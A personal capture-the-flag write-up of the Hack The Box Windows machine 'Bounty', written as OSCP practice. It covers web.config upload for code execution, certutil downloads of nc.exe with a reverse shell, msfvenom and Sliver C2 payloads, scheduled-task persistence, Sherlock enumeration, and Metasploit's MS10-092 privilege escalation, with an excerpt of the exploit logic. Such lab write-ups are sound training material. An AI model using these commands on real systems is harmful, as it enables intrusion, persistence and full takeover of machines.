# Bounty Writeup

Name: Bounty
Date:  16/5/2023
Difficulty:  Easy
Goals:  
- OSCP Prep & finish with speed as I have already reconed 
- Try Sherlock.ps1 
Learnt:
- Metasploit de-rusting
- IIS web.config is still an issue
- Never forget the potato exploits [0xdf](https://0xdf.gitlab.io/2018/10/27/htb-bounty.html), but be tacticoool and strategican-actually-root-boxes-though
- Sliver 
Beyond Root:
- Write my C Reverse Shell.

The bearded weirdo himself:
![](merlin.jpg)

## From a bright Future 

Having looked at the end and the being of the [[Bounty-Old-Attempt]](s), I do not want this to be a Helped-Through
and as of 16/5/2023 I want to finish of this easy box that should probably not take too long.
![](agood4months.png)

Obviously I understand I have reconed and there is a way to have a web shell on the box, but I have not read the web.config just incase there is a password in it. I wont look at the original directory either and be starting from a fresh VM.
![](naabunaabu.png)

Checking header security and method given nuclei and how old and barren the website is
![](curlforoptions.png)

Checking if the bearded weirdo has any information - magic is bad m'kay
![](exiftoolmerlin.png)

And directory were uploading has already occured
![](uploadedfiles.png)

#### IIS research 

[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services) 

*"As any .Net application, MVC applications have a **web.config** file, where "**assemblyIdentity**" XML tags identifies every binary file the application uses... In addition, .Net MVC applications are structured to define **other web.config files**, having the aim to include any declaration for specific namespaces for each set of viewpages, relieving developers to declare “@using” namespaces in every file.*"

https://github.com/irsdl/IIS-ShortName-Scanner 

The SSL certificates are not valid for cloudflare on the links to some HackTricks Article referenc
![](sploiterbutnotbreaking.png)
[ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/), which led to https://github.com/wireghoul/htshells - but for php and https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

Testing out the IISfinal wordlist 
![](iisfinaltry.png)

Finding the file uplaoding with the glorious feroxbuster
![](transferwoot.png)

A secure non ssl file transfer for use to:
![](securefiletransfer.png)

Testing this web.config 
![](merlino.png)

The weird one useness of this technique:
![](itseemitgetoneuse.png)

Sometimes I could chain commands other times I had to reupload, but as I am very aware the OPSec on this box no my part was like a rhino riding tank playing loud dance music while calling down  orbital laser bombardment to "learn".

```powershell
certutil -urlcache -split -f http://10.10.14.8/nc.exe c:\programdata\nc.exe
c:\programdata\nc.exe 10.10.14.8 8443 -e cmd
```

![](footholdintomerlin.png)

```powershell
systeminfo
```

To get things done
```
msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.8 LPORT=8444 -f exe > badInstaller.exe
```

Sliver for cheatsheet and workflow
```go
generate beacon --mtls 10.10.14.8:9001 --arch amd64 --os windows --save /home/kali/Bounty-Data
generate --mtls 10.10.14.8:9002 --arch amd64 --os windows --save /home/kali/Bounty-Data
mtls -L 10.10.14.8 -l 9001 
mtls -L 10.10.14.8 -l 9002
// Check jobs
jobs 
use sessionID
// upx the binaries
```

```powershell
curl -L https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 -o Sherlock.ps1
certutil -urlcache -split -f http://10.10.14.8/badInstaller.exe c:\programdata\badInstaller.exe
certutil -urlcache -split -f http://10.10.14.8/Sherlock.ps1 c:\programdata\Sherlock.ps1
certutil -urlcache -split -f http://10.10.14.8/sliver/ACTUAL_JUMPSUIT.exe c:\programdata\ACTUAL_JUMPSUIT.exe
certutil -urlcache -split -f http://10.10.14.8/sliver/SUFFICIENT_LIFT.exe c:\programdata\SUFFICIENT_LIFT.exe
```

Schedule tasks that utilmately failed, but learnt more about `schtasks`
```powershell
# Second attempt to confirm and experiement
schtasks /create /sc minute /mo 1 /tn badInstaller /tr c:\programdata\badInstaller.exe

# These failed...the day previous
schtasks /create /sc minute /mo 1 /tn ACTUAL_JUMPSUIT /tr c:\programdata\ACTUAL_JUMPSUIT.exe
schtasks /create /sc minute /mo 1 /tn SUFFICIENT_LIFT /tr c:\programdata\SUFFICIENT_LIFT.exe
# Deletes the task upon completion!
/z
schtasks /create /sc minute /mo 1 /tn BadInstaller /tr c:\programdata\BadInstaller.exe /z

schtasks /delete /tn badInstaller /f
schtasks /delete /tn ACTUAL_JUMPSUIT /f 
schtasks /delete /tn SUFFICIENT_LIFT /f 
```
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-delete

I tried again
![](triedagainwithschtasks.png)

Nevermind there is alway Sliver
```powershell
# These drop back into the shell after use and do not hang!
.\ACTUAL_JUMPSUIT.exe
```

Then executing the powershell msfvenom binary
![](actualjumpsuitbeaconworkingmaybe.png)
Which did not work, but there you go... the regular shell drop back `.\badInstaller.exe` so actually it is probably the machine not allowing execution via specific means possibly?

```powershell
PS C:\ProgramData> Find-AllVulns



Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Supported on single-core systems

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
```

These are both metasploit exploits https://www.exploit-db.com/exploits/19930, https://www.exploit-db.com/exploits/37367. 

```powershell
# 19930 
# create a schedule
cmdline = "schtasks.exe /create /tn #{taskname} /tr \"#{cmd}\" /sc monthly /f
# But read into 
{sysdir}\\system32\\tasks\\#{taskname}
# with some content were which is manipulatable to then change the security context to then run as system 

	content.gsub!('LeastPrivilege', 'HighestAvailable')
		content.gsub!(/<UserId>.*<\/UserId>/, '<UserId>S-1-5-18</UserId>')
		content.gsub!(/<Author>.*<\/Author>/, '<Author>S-1-5-18</Author>')
		#content.gsub!('<LogonType>InteractiveToken</LogonType>', '<LogonType>Password</LogonType>')
		content.gsub!('Principal id="Author"', 'Principal id="LocalSystem"')
		content.gsub!('Actions Context="Author"', 'Actions Context="LocalSystem"')
		content << "<!-- ZZ -->"
```

At this point knowing that a metasploit module is going to work and 10 minutes of looking for an exploit by search engine dorking for me, at this point is now a rabbit hole for a over 10 year old exploit, which in OSCP could be in and of itself a ego/points tripper where  you just have to use the exploit or have the time to make your own for a old system. I am going to choose to not bang my head on this for another hour and just pop the box.

Consider my metasploit is a tad rusty I am happy with that. And it also havs to be a meterpreter session.
```ruby
# Make an inital 64x metepreter shell 

exploit -j # to background
# Create a second multi/handler for our scheduled task exploit
set payload windows/shell/reverse_tcp # default for the exploit
set lhost tun0 # use 4444 for exploit
exploit -j # to background 
# Check targets for the weirdness of versioning etc
use windows/local/ms10_092_schelevator
set payload windows/meterpreter/reverse_tcp
set session 3 # because there you go
```
- Check metasploit exploit requirements
- I did read the exploit code and consider the likelyhood of making my own

![](wearesystem.png)

## Notes 

IP: 10.10.10.93
OS: Windows
Hostname: Bounty
Machine Purpose: Webserver
Services: IIS 80
Service Languages: aspx
Users: merlin
Credentials: n
